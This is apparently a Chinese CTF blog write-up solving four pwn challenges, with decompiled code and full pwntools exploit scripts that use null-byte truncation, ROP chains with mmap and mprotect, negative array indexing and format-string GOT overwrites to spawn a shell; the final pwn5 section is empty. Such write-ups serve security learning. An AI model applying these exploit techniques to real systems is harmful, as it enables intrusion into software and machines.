---
layout:     post
title:      随便做做的部分pwn题
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>[索引目录]  
>0x001 pwn1(strlen的"\x00"截断)  
>0x002 pwn2(mmap)  
>0x003 pwn3(数组越界)  
>0x004 pwn4(格式化字符串 + mprotect)  
>0x005 pwn5  
<!-- more -->


## 0x001 pwn1(strlen的"\x00"截断)

```
v2 = strlen(s);
if ( v2 > 0x7F )
{
puts("Error: input is too long.");
exit(1);
}

...

for ( i = &v11; v3; v3 = *(_BYTE *)(v6 + 1) )
{
while ( v3 != '%' )
{
  *i++ = v3;
  v3 = *++v1;
  if ( !*v1 )
    return printf("Decode Result: %s\n", &v11);
}
v5 = v1[1];
v10 = 0;
nptr = v5;
v9 = v1[2];
*i = strtoul(&nptr, 0, 16);
v6 = (int)(v1 + 2);
++i;
v1 = (char *)(v6 + 1);
}
```

puts函数
```
int puts(char *string)
```

"%" + "\x00" 绕过检查
```
from pwn import *

context.log_level = 'debug'

s = process("./pwn1")
elf = ELF("./pwn1")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = 0x08048590

p = "http://%\x00" + "1" * (0x9c + 2 -9)
p += p32(puts_plt)
p += p32(main_addr)
p += p32(puts_got)

sleep(0.2)
s.send(p + "\n")

s.recvuntil("http://\n")
data = s.recv(4)
puts_addr = u32(data)
print "puts_addr: [" + hex(puts_addr) + "]"


libc.base = puts_addr - libc.symbols["puts"]
system_addr = libc.symbols["system"] + libc.base
binsh_addr = libc.search("/bin/sh").next() + libc.base

p = "http://%\x00" + "1" * (0x9c + 2 -9)
p += p32(system_addr)
p += p32(main_addr)
p += p32(binsh_addr)

sleep(0.2)
s.send(p + "\n")

s.interactive()
```


## 0x002 pwn2(mmap)

```
      switch ( v7 )
      {
        case 1:
          adds();
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4A88;
          break;
        case 2:
          subs();
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4AB8;
          break;
        case 3:
          muls("%d");
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4AA8;
          break;
        case 4:
          divs("%d");
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4A98;
          break;
        case 5:
          memcpy(&v6, v9, 4 * v8);
          free(v9);
          return 0;
        default:
          v5 = "Invalid option.\n";
          puts("Invalid option.\n");
          break;
      }

# &v6
-0000000000000040 var_40          db ?
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
```

mmap函数
```
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
[prot] :
#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed. */
#define PROT_NONE        0x0                /* Page can not be accessed.  */

[flags] :
#define MAP_SHARED        0x01           /* Share changes.  */
#define MAP_PRIVATE       0x02           /* Changes are private.  */
#define MAP_FIXED         0x10           /* Interpret addr exactly.  */
#ifdef __USE_MISC
# define MAP_FILE         0
# ifdef __MAP_ANONYMOUS
#  define MAP_ANONYMOUS   __MAP_ANONYMOUS /* Don't use a file.  */
# else
#  define MAP_ANONYMOUS   0x20            /* Don't use a file.  */
# endif
# define MAP_ANON        MAP_ANONYMOUS
```

调用mmap设置一块新内存执行sh
```
from pwn import *

context.log_level = 'debug'

s = process("./pwn2")
elf = ELF("./pwn2")

def write(con = 0):
    x = 0xffffffff
    y = x - con    # x - y = 0xffffffff - (0xffffffff - con)
    s.readuntil("=> ")
    s.sendline("2")
    s.readuntil("x: ")
    s.sendline(str(x))
    s.readuntil("y: ")
    s.sendline(str(y))
    s.readuntil("=> ")
    s.sendline("2")
    s.readuntil("x: ")
    s.sendline("40")
    s.readuntil("y: ")
    s.sendline("40")


log.info("#--------------------------------create padding")
pause()
s.readuntil("calculations: ")
s.sendline("255")

for i in range(18):
    x = "40"
    y = "40"
    s.readuntil("=>")
    s.sendline("2")
    s.readuntil("x:")
    s.sendline(x)
    s.readuntil("y:")
    s.sendline(y)


log.info("#--------------------------------call mmap(sh_addr, len(sh), 7, 34, 0, 0)")
pause()
read_plt = elf.symbols["read"]
mmap_plt = elf.symbols["mmap"]
rdi = 0x0000000000401b73
rsi = 0x0000000000401c87
rdx = 0x0000000000437a85
rcx = 0x00000000004b8f17
sh_addr = 0xcccccccc
sh = asm(shellcraft.amd64.linux.sh(), arch='amd64')

write(rdi)
write(sh_addr)
write(rsi)
write(len(sh))
write(rdx)
write(7)
write(rcx)
write(34)
write(mmap_plt)


log.info("#--------------------------------call read & getshell")
pause()
write(rdi)
write(0)
write(rsi)
write(sh_addr)
write(rdx)
write(len(sh))
write(read_plt)
write(sh_addr)

s.readuntil("=> ")
s.sendline('5')
s.sendline(sh)
s.interactive()
```


## 0x003 pwn3(数组越界)

数组边界上溢
```
for ( i = 0; i <= 9; ++i )
{
puts("enter index");
fflush(stdout);
__isoc99_scanf("%d", &v1);
puts("enter value");
fflush(stdout);
__isoc99_scanf("%d", &v2);
if ( v1 > 9 )
  exit(0);
v5[v1] = v2;
}

# v5
-00000030 var_30          dd 11 dup(?)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

利用负数绕过
```
from pwn import *

context.log_level = 'debug'

s = process("./pwn3")
elf = ELF("./pwn3")

s.readuntil("call you?")
s.sendline("wooy0ung")

system_addr = elf.symbols['system']
scanf_addr = elf.symbols['__isoc99_scanf']
ret_off = 0x3ffffff2	# -14
pop2_ret = 0x080487ba
format_addr = 0x804882f
data_base = 0x8049b24

s.readuntil("index")
s.sendline("-%s" % (ret_off + 1))
s.readuntil("value")
s.sendline("%s" % scanf_addr)

s.readuntil("index")
s.sendline("-%s" % (ret_off))
s.readuntil("value")
s.sendline("%s" % pop2_ret)

s.readuntil("index")
s.sendline("-%s" % (ret_off - 1))
s.readuntil("value")
s.sendline("%s" % format_addr)

s.readuntil("index")
s.sendline("-%s" % (ret_off - 2))
s.readuntil("value")
s.sendline("%s" % data_base)

s.readuntil("index")
s.sendline("-%s" % (ret_off - 3))
s.readuntil("value")
s.sendline("%s" % system_addr)

s.readuntil("index")
s.sendline("-%s" % (ret_off - 4))
s.readuntil("value")
s.sendline("%s" % 0xffffffff)	# padding

s.readuntil("index")
s.sendline("-%s" % (ret_off - 5))
s.readuntil("value")
s.sendline("%s" % data_base)

s.readuntil("index")
s.sendline("1")
s.readuntil("value")
s.sendline("1")

sleep(0.2)
s.sendline("/bin/sh")
s.interactive()
```


## 0x004 pwn4(格式化字符串 + mprotect)

format string漏洞
```
int sub_80485C4()
{
  char s; // [esp+10h] [ebp-108h]
  char v2; // [esp+10Fh] [ebp-9h]

  setbuf(stdout, 0);
  while ( 1 )
  {
    printf("KEY:");
    fgets(&s, 0xFF, stdin);
    v2 = 0;
    if ( !strcmp(&s, "STjJaOEwLszsLwRy\n") )
      break;
    printf("ERROR:");
    printf(&s);
  }
  return puts("okey,you entered it.");
}
```

栈溢出
```
char *sub_804858D()
{
  char addr; // [esp+10h] [ebp-88h]

  mprotect(&addr, 0x80u, 7);
  return gets(&addr);
}
```

poc
```
%70$p	# format偏移70处到内存地址的内容

p = "1111 %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"

ERROR:1111 08048705 f77895a0 f75daf12 41414141 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520

偏移4，p = "1111 %4$x"
```

翻资料时正好看到关于GOT和PLT表的，记录一下
```
GOT（Global Offset Table）：全局偏移表用于记录在 ELF 文件中所用到的共享库中符号的绝对地址。在程序刚开始运行时，GOT 表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。

PLT（Procedure Linkage Table）：过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。
```

利用gets溢出，调用mprotect，最后跳到shellcode
```
from pwn import *

context.log_level = "debug"
context.arch = "i386"

s = process("./safedoor")
elf = ELF("./safedoor")
#gdb.attach(proc.pidof(s)[0], "b *0x08048645\nc\n")

log.info("#--------------------------------leak stack addr")
pause()
#p = "1111 %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
#p = "1111 %08x %08x %08x %08x"
p = "1111 %70$x"

s.recvuntil("KEY:")
s.sendline(p)

s.recvuntil("1111 ")
data = s.recvuntil("\n")[:-1]
ebp = int(data,16)
stack_addr = (ebp-280) & 0xfffff000

print "stack_addr: [" + hex(stack_addr) + "]"


log.info("#--------------------------------call mprotect & system")
pause()
mprotect_plt = elf.plt["mprotect"]
puts_got = elf.got["puts"]
gets_plt = elf.plt["gets"]
vul_addr = 0x0804858D
pop3_ret = 0x080486cd

pop_ret = 0x080483e1

sh = asm(shellcraft.i386.linux.sh(), arch = "i386")

print "mprotect_plt: [" + hex(mprotect_plt) + "]"

for i in range(2):
    l = (vul_addr >> (i * 8)) & 0xff
    p = p32(puts_got + i)
    p += "%%%dc"%(l-4)+"%4$hhn"

    s.recvuntil("KEY:")
    s.sendline(p)

s.recvuntil("KEY:")
s.sendline("STjJaOEwLszsLwRy")

p = "1" * (0x88 + 4)
p += p32(mprotect_plt)
p += p32(pop3_ret)
p += p32(stack_addr)
p += p32(0xff)
p += p32(7)
p += p32(gets_plt)
p += p32(pop_ret)
p += p32(stack_addr)
p += p32(stack_addr)    

s.sendline(p)
sleep(0.2)

s.sendline(sh)

s.interactive()
```


## 0x005 pwn5